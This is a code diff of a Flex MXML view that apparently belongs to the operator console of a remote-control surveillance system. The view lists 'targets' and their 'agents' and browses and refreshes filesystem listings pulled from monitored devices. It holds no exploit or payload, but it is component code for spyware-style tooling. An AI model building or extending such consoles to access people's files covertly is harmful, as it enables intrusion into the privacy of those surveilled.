@@ -1,12 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <s:VGroup xmlns:fx="http://ns.adobe.com/mxml/2009"
-          xmlns:s="library://ns.adobe.com/flex/spark"
-          xmlns:mx="library://ns.adobe.com/flex/mx"
-          xmlns:filesystem="it.ht.rcs.console.operations.view.filesystem.*"
-          width="100%" height="100%" removedFromStage="onRemovedFromStage()" addedToStage="onAddedToStage()">
+					xmlns:s="library://ns.adobe.com/flex/spark"
+					xmlns:mx="library://ns.adobe.com/flex/mx"
+					xmlns:filesystem="it.ht.rcs.console.operations.view.filesystem.*"
+					width="100%"
+					height="100%"
+					removedFromStage="onRemovedFromStage()"
+					addedToStage="onAddedToStage()">
 
-  <fx:Script>
-    <![CDATA[
+	<fx:Script>
+		<![CDATA[
       import it.ht.rcs.console.agent.controller.AgentManager;
       import it.ht.rcs.console.agent.model.Agent;
       import it.ht.rcs.console.dashboard.view.renderer.Icons;
@@ -14,6 +17,9 @@
       import it.ht.rcs.console.evidence.controller.EvidenceManager;
       import it.ht.rcs.console.evidence.model.Evidence;
       import it.ht.rcs.console.operations.view.OperationsSection;
+      import it.ht.rcs.console.push.PushController;
+      import it.ht.rcs.console.push.PushEvent;
+      import it.ht.rcs.console.target.model.Target;
       import it.ht.rcs.console.utils.Size;
       import it.ht.rcs.console.utils.TimeUtils;
       
@@ -23,386 +29,527 @@
       import mx.collections.ArrayList;
       import mx.collections.HierarchicalCollectionView;
       import mx.collections.HierarchicalData;
+      import mx.collections.IHierarchicalCollectionView;
+      import mx.collections.IViewCursor;
       import mx.collections.ListCollectionView;
+      import mx.controls.advancedDataGridClasses.AdvancedDataGridColumn;
       import mx.core.FlexGlobals;
       import mx.events.AdvancedDataGridEvent;
       import mx.events.CollectionEvent;
       import mx.events.ListEvent;
       import mx.rpc.events.ResultEvent;
       import mx.utils.ObjectUtil;
-      
-      [Bindable]
-      public var section:OperationsSection;
-      
-      [Bindable]
-      private var hcv:HierarchicalData;
-      
-      
-      private var vScroll:int=0;
-      private var currentSelection:Array=new Array;
+
+			[Bindable]
+			public var section:OperationsSection;
+
+			[Bindable]
+			private var hcv:HierarchicalData;
       
       
-      public function showTree(e:Event=null):void
-      {
-        actionBar.addEventListener("pendingUpdate", onPendingUpdate)
-        actionBar.addEventListener("pendingDelete", onPendingDelete)
-        buildAgentsTree()
-        //EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, agent ? agent._id : null,"[root]" ,onResult);
-      }
-      
-      //populate tree with agents without calling remote 'filesystem method'
-      private function buildAgentsTree():void
-      {
-        var root:FileSystemItem = new FileSystemItem();
-        //root.addEventListener("updated", onItemUpdated)
-        root.name=section.stateManager.selectedTarget.name;
-        root.children=[];
-        root.attr=ROOT;
-        root.parent=null
+      private var lastTarget:Target;
+      private var lastAgent:Agent;
+
+
+			private var vScroll:int=0;
+			private var currentSelection:Array=new Array;
+
+
+			public function showTree(e:Event=null):void
+			{
+				actionBar.addEventListener("pendingUpdate", onPendingUpdate);
+				actionBar.addEventListener("pendingDelete", onPendingDelete);
+				buildAgentsTree();
+
+			}
+
+			//populate tree with agents without calling remote 'filesystem method'
+			private function buildAgentsTree():void
+			{
+				var root:FileSystemItem=new FileSystemItem();
+				//root.addEventListener("updated", onItemUpdated)
+				root.name=section.stateManager.selectedTarget.name;
+				root.children=[]
+				root.attr=ROOT;
+				root.parent=null
+
+				var agents:ListCollectionView;
+
+				if (section.stateManager.selectedAgent == null)
+				{
+					agents=AgentManager.instance.getAgentsForTarget(section.stateManager.selectedTarget._id);
+				}
+				else
+				{
+					var al:ArrayList=new ArrayList([section.stateManager.selectedAgent])
+					agents=new ListCollectionView(al);
+				}
+				for (var i:int=0; i < agents.length; i++)
+				{
+					var subroot:FileSystemItem=new FileSystemItem(); //temp
+					subroot.children=[{name: "retrieving data...", scanning: true}]
+					subroot.attr=SUBROOT;
+					subroot.name=agents.getItemAt(i).name;
+					subroot.agent=agents.getItemAt(i) as Agent;
+					subroot.aid=subroot.agent._id;
+					subroot.parent=root;
+					root.children.push(subroot);
+				}
+
+				hcv=new HierarchicalData(root);
+				//hcv.showRoot = true;
+				grid.dataProvider=hcv;
+
+				// EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, agents[0]._id, null, onResult)
+			}
+
+			private function onResult(e:ResultEvent):void
+			{
+
+
+
+			}
+
+			private function onItemOpen(e:AdvancedDataGridEvent):void
+			{
+				vScroll=grid.verticalScrollPosition;
+
+
+				//currentSelection=grid.selectedItems;
+
+				trace("index: " + vScroll);
+				var item:FileSystemItem=e.item as FileSystemItem;
         
-        var agents:ListCollectionView;
-        
-        if (section.stateManager.selectedAgent == null)
-        {
-          agents = AgentManager.instance.getAgentsForTarget(section.stateManager.selectedTarget._id);
-        }
-        else
-        {
-          var al:ArrayList=new ArrayList([section.stateManager.selectedAgent])
-          agents=new ListCollectionView(al);
-        }
-        for(var i:int=0;i<agents.length;i++)
-        {
-          var subroot:FileSystemItem = new FileSystemItem(); //temp
-          subroot.children = [{name:"retrieving data...", scanning:true}]//
-          subroot.attr=SUBROOT;
-          subroot.name = agents.getItemAt(i).name;
-          subroot.agent = agents.getItemAt(i) as Agent;
-          subroot.parent = root;
-          root.children.push(subroot);
-        }
-        
-        hcv = new HierarchicalData(root);
-        //hcv.showRoot = true;
-        grid.dataProvider = hcv;
-      }
-      
-      private function onItemOpen(e:AdvancedDataGridEvent):void
-      {
-        vScroll=grid.verticalScrollPosition;
-        //currentSelection=grid.selectedItems;
-        
-        trace("index: "+ vScroll)
-        var item:FileSystemItem=e.item as FileSystemItem;
-        grid.selectedItems=[item]
-        actionBar.selectedObject=grid.selectedItems[0];
-        actionBar.selectedObjects=grid.selectedItems;
-        item.addEventListener("updated", onItemUpdated)
-        trace(item.name)
-        if(item.attr!=ROOT)
-        {
-          if(item.parent.attr==ROOT)
+        item.updated=false;
+        item.pending=false;
+
+				grid.selectedItems=[item];
+				actionBar.selectedObject=grid.selectedItems[0];
+				actionBar.selectedObjects=grid.selectedItems;
+
+				item.addEventListener("updated", onItemUpdated);
+
+				if (e.item.attr != ROOT)
+				{
+					if (item.attr == SUBROOT)
+					{
+						EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, item.agent._id, null, item.update);
+					}
+					else   //only if incomplete == true
+					{
+						if(item.incomplete) EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, item.aid, item.path, item.update);
+
+					}
+				}
+			}
+
+
+			private function onPush(e:PushEvent):void
+			{
+				var path:String=e.data.path;
+				var dp:IHierarchicalCollectionView=grid.hierarchicalCollectionView;
+				var cursor:IViewCursor=dp.createCursor();
+
+				while (!cursor.afterLast)
+				{
+
+					if (path == cursor.current["path"])
+					{
+						cursor.current["updated"]=true;
+						cursor.current["pending"]=false;
+            cursor.current["children"]=[{name: "retrieving data...", scanning: true}]
+            grid.expandItem(cursor.current,false)
+
+					}
+          if (cursor.current["attr"] == SUBROOT && cursor.current["aid"] == e.data.aid)
           {
-            EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, item.agent._id,"[root]" , item.update);
-          }
-          else
-          {
-            
-            if(item.agent.platform=="windows" || item.agent.platform=="winmo" || item.agent.platform=="symbian")
+            cursor.current["updated"]=true;
+            cursor.current["pending"]=false;
+            if(cursor.current["children"].length==0 || !cursor.current["children"])
             {
-              EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, item.agent._id, item.path+"\\", item.update);
+              cursor.current["children"]=[{name: "retrieving data...", scanning: true}];
+              grid.expandItem(cursor.current,false)
             }
-            else
-            {
-              EvidenceManager.instance.filesystem(section.stateManager.selectedTarget._id, item.agent._id, item.path+"/", item.update);
-            }
+             
           }
-        }
-      }
-      
-      private function onItemUpdated(e:Event):void
-      {
-        e.currentTarget.removeEventListener("updated", onItemUpdated)
-        trace(e.currentTarget.children.length);
-        grid.invalidateDisplayList()
-        grid.dataProvider = hcv;
-        grid.validateNow();
-        grid.verticalScrollPosition=vScroll;
-        grid.selectedItems=[e.currentTarget]
-          
-        actionBar.selectedObject=grid.selectedItems[0];
-        actionBar.selectedObjects=grid.selectedItems;
-        
-        //ask for pending items
-        e.currentTarget.addEventListener("pendingResult", onPendingResult)
-        AgentManager.instance.getFilesystems(e.currentTarget.agent,e.currentTarget.onPendingResult)
-        
-      }
-      
-      private function onPendingResult(e:Event):void
-      {
-        e.currentTarget.removeEventListener("pendingResult", onPendingResult)
-        grid.invalidateDisplayList();
-        grid.dataProvider = hcv;
-        grid.validateNow();
-        grid.verticalScrollPosition=vScroll;
-        grid.selectedItems=[e.currentTarget];
-        actionBar.selectedObject=grid.selectedItems[0];
-        actionBar.selectedObjects=grid.selectedItems;
-      }
-      
-      private function onPendingUpdate(e:Event):void
-      {
-        vScroll=grid.verticalScrollPosition;
-        grid.invalidateDisplayList();
-        grid.dataProvider = hcv;
-        grid.validateNow();
-        grid.verticalScrollPosition=vScroll;
-        grid.selectedItems=[e.currentTarget]
-        actionBar.selectedObject=grid.selectedItems[0];
-        actionBar.selectedObjects=grid.selectedItems;
-      }
-      
-      private function onPendingDelete(e:Event):void
-      {
-        //trace(actionBar.deletedItems.length) //TODO - CHECK IF !null
+					cursor.moveNext();
+				}
+			}
 
-      }
-      
-      //this is the old method to retrieve all data togheter
-     /*  
-      private function onResult(event:ResultEvent):void
-      {
-        var root:Object = { name: section.stateManager.selectedTarget.name, children: [], attr: ROOT, parent: null };
-        
-        var grouped:Object = groupByAgentId(event.result as ArrayCollection);
-        for (var aid:String in grouped) {
-          var subroot:Object = buildSubTree(grouped[aid], aid);
-          subroot.parent = root;
-          root.children.push(subroot);
-        }
 
-        var hcv:HierarchicalCollectionView = new HierarchicalCollectionView(new HierarchicalData(root));
-        hcv.showRoot = true;
-        grid.dataProvider = hcv;
-        
-      } 
-      */
-      
-      private function groupByAgentId(collection:ArrayCollection):Object
-      {
-        var grouped:Object = {};
-        
-        var agents:Array = getAgentsIds();
-        
-        for each (var aid:String in agents)
-          grouped[aid] = [];
-        
-        for each (var e:Evidence in collection)
-          grouped[e.aid].push(e);
+			private function onItemUpdated(e:Event):void
+			{
+				e.currentTarget.removeEventListener("updated", onItemUpdated)
+				trace(e.currentTarget.children.length);
+				grid.invalidateDisplayList()
+				grid.dataProvider=hcv;
+				grid.validateNow();
+				grid.verticalScrollPosition=vScroll;
+				grid.selectedItems=[e.currentTarget]
 
-        return grouped;
-      }
-      
-      private function getAgentsIds():Array
-      {
-        var ids:Array = [];
-        
-        if (section.stateManager.selectedAgent == null) {
-          var agents:ListCollectionView = AgentManager.instance.getAgentsForTarget(section.stateManager.selectedTarget._id);
-          for each (var a:Agent in agents)
-            ids.push(a._id);
-        } else {
-          ids.push(section.stateManager.selectedAgent._id);
-        }
-        
-        return ids;
-      }
+				actionBar.selectedObject=grid.selectedItems[0];
+				actionBar.selectedObjects=grid.selectedItems;
 
-      public static const ROOT:int = -2;
-      public static const SUBROOT:int = -1;
-      public static const FILE:int = 0;
-      public static const FULL_FOLDER:int = 1;
-      public static const EMPTY_FOLDER:int = 3;
-      
-      private function buildSubTree(evidences:Array, aid:String):Object
-      {
-        var subroot:Object = { name: 'Agent', children: [], attr: SUBROOT, parent: null };
+				//ask for pending items
+				e.currentTarget.addEventListener("pendingResult", onPendingResult);
+				//AgentManager.instance.getFilesystems(e.currentTarget.agent,e.currentTarget.onPendingResult)
+
+			}
+
+			private function onPendingResult(e:Event):void
+			{
+				e.currentTarget.removeEventListener("pendingResult", onPendingResult)
+				grid.invalidateDisplayList();
+				grid.dataProvider=hcv;
+				grid.validateNow();
+				grid.verticalScrollPosition=vScroll;
+				grid.selectedItems=[e.currentTarget];
+				actionBar.selectedObject=grid.selectedItems[0];
+				actionBar.selectedObjects=grid.selectedItems;
+			}
+
+			private function onPendingUpdate(e:Event):void
+			{
+				vScroll=grid.verticalScrollPosition;
+				grid.invalidateDisplayList();
+				grid.dataProvider=hcv;
+				grid.validateNow();
+				grid.verticalScrollPosition=vScroll;
+				grid.selectedItems=[e.currentTarget]
+				actionBar.selectedObject=grid.selectedItems[0];
+				actionBar.selectedObjects=grid.selectedItems;
+			}
+
+			private function onPendingDelete(e:Event):void
+			{
+				//trace(actionBar.deletedItems.length) //TODO - CHECK IF !null
+
+			}
+
+			//this is the old method to retrieve all data togheter
+			/*
+			 private function onResult(event:ResultEvent):void
+			 {
+				 var root:Object = { name: section.stateManager.selectedTarget.name, children: [], attr: ROOT, parent: null };
+
+				 var grouped:Object = groupByAgentId(event.result as ArrayCollection);
+				 for (var aid:String in grouped) {
+					 var subroot:Object = buildSubTree(grouped[aid], aid);
+					 subroot.parent = root;
+					 root.children.push(subroot);
+				 }
+
+				 var hcv:HierarchicalCollectionView = new HierarchicalCollectionView(new HierarchicalData(root));
+				 hcv.showRoot = true;
+				 grid.dataProvider = hcv;
+
+			 }
+			 */
+
+			private function groupByAgentId(collection:ArrayCollection):Object
+			{
+				var grouped:Object={};
+
+				var agents:Array=getAgentsIds();
+
+				for each (var aid:String in agents)
+					grouped[aid]=[];
+
+				for each (var e:Evidence in collection)
+					grouped[e.aid].push(e);
+
+				return grouped;
+			}
+
+			private function getAgentsIds():Array
+			{
+				var ids:Array=[];
+
+				if (section.stateManager.selectedAgent == null)
+				{
+					var agents:ListCollectionView=AgentManager.instance.getAgentsForTarget(section.stateManager.selectedTarget._id);
+					for each (var a:Agent in agents)
+						ids.push(a._id);
+				}
+				else
+				{
+					ids.push(section.stateManager.selectedAgent._id);
+				}
+
+				return ids;
+			}
+
+			public static const ROOT:int=-2;
+			public static const SUBROOT:int=-1;
+			public static const FILE:int=0;
+			public static const FULL_FOLDER:int=1;
+			public static const EMPTY_FOLDER:int=3;
+
+			private function buildSubTree(evidences:Array, aid:String):Object
+			{
+				var subroot:Object={name: 'Agent', children: [], attr: SUBROOT, parent: null};
+
+				var agent:Agent=AgentManager.instance.getItem(aid);
+				subroot.name=agent.name;
+				subroot.agent=agent;
+
+				for each (var e:Evidence in evidences)
+				{
+					var path:String=e.data.path;
+					path=path.replace('\\\\', '\\');
+					var separator:String=path.indexOf('/') == -1 ? '\\' : '/';
+					var tokens:Array=path.split(separator);
+					var node:Object=subroot;
+					for (var idx:int=0; idx < tokens.length; idx++)
+					{
+						var t:String=tokens[idx];
+						if (t == '')
+							continue;
+
+						var next:Object=getAppendToNode(node.children, t);
+
+						if (next == null)
+						{
+							next={name: t, children: [], attr: FULL_FOLDER, parent: node};
+							node.children.push(next);
+						}
+
+						node=next;
+
+						if (idx == tokens.length - 1)
+						{ // ultimo elemento del path
+							node.size=e.data.size;
+							node.attr=e.data.attr;
+							node.date=e.da;
+							node.evidence=e;
+							if (e.data.attr == FILE)
+								delete(node.children);
+						}
+					}
+				}
+
+				return subroot;
+			}
+
+			private function getAppendToNode(a:Array, name:String):Object
+			{
+				for each (var el:Object in a)
+					if (el.name == name)
+						return el;
+				return null;
+			}
+
+			private function dateFunction(item:Object, column:AdvancedDataGridColumn):String
+			{
+				try
+				{
+					var value:Number=item[column.dataField];
+					return value ? TimeUtils.timestampFormatter(value * 1000) : '';
+				}
+				catch (e:Error)
+				{
+				}
+				return '';
+			}
+
+			private function sizeFunction(item:Object, column:AdvancedDataGridColumn):String
+			{
+				try
+				{
+					var value:Number=Number(item[column.dataField]);
+
+					return value && item.attr == FILE ? Size.toHumanBytes(value) : '';
+				}
+				catch (e:Error)
+				{
+				}
+				return '';
+			}
+
+
+
+			[Embed('/img/NEW/emptyFolder.png')]
+			private static const emptyFolder:Class;
+			[Embed('/img/NEW/fullFolder.png')]
+			private static const fullFolder:Class;
+			[Embed('/img/NEW/file.png')]
+			private static const file:Class;
+			[Embed('/img/NEW/device/agent_mobile_16.png')]
+			private static const mobile:Class;
+			[Embed('/img/NEW/device/agent_desktop_16.png')]
+			private static const desktop:Class;
+			[Embed('/img/NEW/device.png')]
+			private static const device:Class;
+
+			private function fsIconFunction(item:Object):Class
+			{
+				if (!item)
+					return null;
+
+				if (item.hasOwnProperty("scanning") && item.scanning)
+					return Icons.scanningIcon;
+
+				// if (item.hasOwnProperty('children')) {
+				switch (item.attr)
+				{
+					case ROOT:
+						return Icons.target16;
+					case SUBROOT:
+						return item.agent ? (item.agent.type == 'mobile' ? mobile : desktop) : device;
+					case EMPTY_FOLDER:
+						return emptyFolder;
+					case FULL_FOLDER:
+						return fullFolder;
+					case FILE:
+						return file;
+					default:
+						return null;
+				}
+				//}
+
+				return file;
+			}
+
+			private function onAddedToStage():void
+			{
         
-        var agent:Agent = AgentManager.instance.getItem(aid);
-        subroot.name = agent.name;
-        subroot.agent = agent;
+        var currentTarget:Target =section.stateManager.selectedTarget
+        var currentAgent:Agent=section.stateManager.selectedAgent;
         
-        for each (var e:Evidence in evidences) {
-          var path:String = e.data.path;
-          path = path.replace('\\\\', '\\');
-          var separator:String = path.indexOf('/') == -1 ? '\\' : '/';
-          var tokens:Array = path.split(separator);
-          var node:Object = subroot;
-          for (var idx:int = 0; idx < tokens.length; idx++) {
-            var t:String = tokens[idx];
-            if (t == '') continue;
-            
-            var next:Object = getAppendToNode(node.children, t);
-            
-            if (next == null) {
-              next = { name: t, children: [], attr: FULL_FOLDER, parent: node };
-              node.children.push(next);
-            }
-            
-            node = next;
-            
-            if (idx == tokens.length-1) { // ultimo elemento del path
-              node.size = e.data.size;
-              node.attr = e.data.attr;
-              node.date = e.da;
-              node.evidence = e;
-              if (e.data.attr == FILE)
-                delete(node.children);
-            }
-          }
-        }
         
-        return subroot;
-      }
-      
-      private function getAppendToNode(a:Array, name:String):Object
-      {
-        for each (var el:Object in a)
-          if (el.name == name)
-            return el;
-        return null;
-      }
-      
-      private function dateFunction(item:Object, column:AdvancedDataGridColumn):String
-      {
-        try {
-          var value:Number = item[column.dataField];
-          return value ? TimeUtils.timestampFormatter(value * 1000) : '';
-        } catch (e:Error) {}
-        return '';
-      }
-      
-      private function sizeFunction(item:Object, column:AdvancedDataGridColumn):String
-      {
-        try {
-          var value:Number =Number( item[column.dataField]);
-            trace("raw: " +item[column.dataField])
-            trace("value: "+value)
-            trace("formated: "+Size.toHumanBytes(value));
-          return value && item.attr == FILE ? Size.toHumanBytes(value) : '';
-        } catch (e:Error) {}
-        return '';
-      }
-      
-     
-      
-      [Embed('/img/NEW/emptyFolder.png')]
-      private static const emptyFolder:Class;
-      [Embed('/img/NEW/fullFolder.png')]
-      private static const fullFolder:Class;
-      [Embed('/img/NEW/file.png')]
-      private static const file:Class;
-      [Embed('/img/NEW/device/agent_mobile_16.png')]
-      private static const mobile:Class;
-      [Embed('/img/NEW/device/agent_desktop_16.png')]
-      private static const desktop:Class;
-      [Embed('/img/NEW/device.png')]
-      private static const device:Class;
-      
-      private function fsIconFunction(item:Object):Class
-      {
-        if (!item) return null;
+				FlexGlobals.topLevelApplication.addEventListener(RefreshEvent.REFRESH, showTree);
         
-        if (item.scanning) return Icons.scanningIcon;
-        
-       // if (item.hasOwnProperty('children')) {
-          switch (item.attr) {
-            case ROOT: return Icons.target16;
-            case SUBROOT: return item.agent ? (item.agent.type == 'mobile' ? mobile : desktop) : device;
-            case EMPTY_FOLDER: return emptyFolder;
-            case FULL_FOLDER: return fullFolder;
-            case FILE: return file;
-            default: return null;
-          }
-        //}
-        
-        return file;
-      }
-      
-      private function onAddedToStage():void
-      {
-        FlexGlobals.topLevelApplication.addEventListener(RefreshEvent.REFRESH, showTree);
-        if (grid)
-          showTree();
-      }
-      
-      private function onRemovedFromStage():void
-      {
-        FlexGlobals.topLevelApplication.removeEventListener(RefreshEvent.REFRESH, showTree);
-        grid.dataProvider = null;
-      }
-      
-      private function onSelectionChange():void
-      {
-      trace("selection change")
-      //FUCKED BINDINGS !!!! :(
-      actionBar.selectedObject=grid.selectedItems[0];
-      actionBar.selectedObjects=grid.selectedItems;
-      }
-      
-      private function setToolTip(object:Object):String
-      {
-        if(object is AdvancedDataGridColumn)
+        if(lastTarget!=currentTarget || lastAgent!= currentAgent)
         {
-          switch(object.dataField)
-          {
-          case "name":
-            return R.get('PATH')
-            break;
-          case "date":
-          return R.get('DATE')
-          break;
-          case "size":
-            return R.get('SIZE')
-            break;
-          case "path":
-            return R.get('PATH')
-            break;
-          case "pending":
-            return R.get('PENDING')
-            break;
-          }
-       
+          grid.dataProvider=null;
+          lastTarget=currentTarget
+          lastAgent=currentAgent
+          if (grid)
+            showTree();
         }
-        
-        return "";
-      }
-      
-     
-      protected function openItem(event:ListEvent):void
-      {
-        var selectedRow:Object = event.currentTarget.selectedItem;
-        grid.expandItem(selectedRow, !event.target.isItemOpen(selectedRow))
-      }
-      
-    ]]>
-  </fx:Script>
-  
-  <filesystem:FileSystemActionBar id="actionBar"  section="{section}" />
-  
-  <!--mx:Tree id="tree" width="100%" height="100%" allowMultipleSelection="false" borderVisible="false"
-           labelField="name" showRoot="true"/-->
-  
-  <mx:AdvancedDataGrid id="grid" width="100%" height="100%" sortableColumns="false" iconFunction="fsIconFunction" allowMultipleSelection="true" change="onSelectionChange()" itemOpen="onItemOpen(event)" dataProvider="{hcv}" dataTipFunction="setToolTip" doubleClickEnabled="true" itemDoubleClick="openItem(event)">
-    <mx:columns>
-      <mx:AdvancedDataGridColumn dataField="name" width="400" headerText="{R.get('PATH')}"  showDataTips="true"  sortable="false"/>
-     
-      <mx:AdvancedDataGridColumn dataField="date" labelFunction="dateFunction" width="160" headerText="{R.get('DATE')}"  showDataTips="true"  sortable="false"/>
-      <mx:AdvancedDataGridColumn dataField="size" labelFunction="sizeFunction" width="100" headerText="{R.get('SIZE')}"  showDataTips="true"  sortable="false"/>
-      <!--mx:AdvancedDataGridColumn dataField="attr" width="100"/-->
-      <mx:AdvancedDataGridColumn dataField="pending" headerText="..." itemRenderer="it.ht.rcs.console.operations.view.filesystem.renderers.PendingItemRenderer" width="20"  showDataTips="true"  sortable="false"/>
-    </mx:columns>
-  </mx:AdvancedDataGrid>
-  
+			
+
+				PushController.instance.addEventListener(PushEvent.FILESYSTEM, onPush);
+			}
+
+			private function onRemovedFromStage():void
+			{
+				FlexGlobals.topLevelApplication.removeEventListener(RefreshEvent.REFRESH, showTree);
+				
+
+				PushController.instance.removeEventListener(PushEvent.ENTITY, onPush);
+			}
+
+			private function onSelectionChange():void
+			{
+				trace("selection change")
+				//FUCKED BINDINGS !!!! :(
+				actionBar.selectedObject=grid.selectedItems[0];
+				actionBar.selectedObjects=grid.selectedItems;
+			}
+
+			private function setToolTip(object:Object):String
+			{
+				if (object is AdvancedDataGridColumn)
+				{
+					switch (object.dataField)
+					{
+						case "name":
+							return R.get('PATH')
+							break;
+						case "date":
+							return R.get('DATE')
+							break;
+						case "size":
+							return R.get('SIZE')
+							break;
+						case "path":
+							return R.get('PATH')
+							break;
+						case "pending":
+							return R.get('PENDING')
+							break;
+					}
+
+				}
+
+				return "";
+			}
+
+
+			protected function openItem(event:ListEvent):void
+			{
+				var selectedRow:Object=event.currentTarget.selectedItem;
+				grid.expandItem(selectedRow, !event.target.isItemOpen(selectedRow));
+			}
+
+			protected function setColumnStyle(data:Object, column:AdvancedDataGridColumn):Object
+			{
+				if (data.pending) //pending items are RED
+				{
+					return {color: 0xCC0000}
+				}
+				else if (data.updated) //updated items are GREEN
+				{
+					return {color: 0x006633}
+				}
+				return {color: 0x000000}
+			}
+		]]>
+	</fx:Script>
+
+	<filesystem:FileSystemActionBar id="actionBar"
+																	section="{section}"/>
+
+	<!--mx:Tree id="tree" width="100%" height="100%" allowMultipleSelection="false" borderVisible="false"
+					 labelField="name" showRoot="true"/-->
+
+	<mx:AdvancedDataGrid id="grid"
+											 width="100%"
+											 height="100%"
+											 sortableColumns="false"
+											 iconFunction="fsIconFunction"
+											 allowMultipleSelection="true"
+											 change="onSelectionChange()"
+											 itemOpen="onItemOpen(event)"
+											 dataProvider="{hcv}"
+											 dataTipFunction="setToolTip"
+											 doubleClickEnabled="true"
+											 itemDoubleClick="openItem(event)">
+		<mx:columns>
+
+			<mx:AdvancedDataGridColumn dataField="name"
+																 width="400"
+																 headerText="{R.get('PATH')}"
+																 showDataTips="true"
+																 sortable="false"
+																 styleFunction="setColumnStyle"
+                                 />
+			<mx:AdvancedDataGridColumn dataField="pending"
+																 headerText="..."
+																 itemRenderer="it.ht.rcs.console.operations.view.filesystem.renderers.PendingItemRenderer"
+																 width="20"
+																 showDataTips="true"
+																 sortable="false"
+																 styleFunction="setColumnStyle"/>
+
+			<mx:AdvancedDataGridColumn dataField="date"
+																 labelFunction="dateFunction"
+																 width="160"
+																 headerText="{R.get('DATE')}"
+																 showDataTips="true"
+																 sortable="false"
+																 styleFunction="setColumnStyle"/>
+			<mx:AdvancedDataGridColumn dataField="size"
+																 labelFunction="sizeFunction"
+																 width="100"
+																 headerText="{R.get('SIZE')}"
+																 showDataTips="true"
+																 sortable="false"
+																 styleFunction="setColumnStyle"/>
+			<!-- mx:AdvancedDataGridColumn dataField="attr" width="100"-->
+
+		</mx:columns>
+	</mx:AdvancedDataGrid>
+
 </s:VGroup>
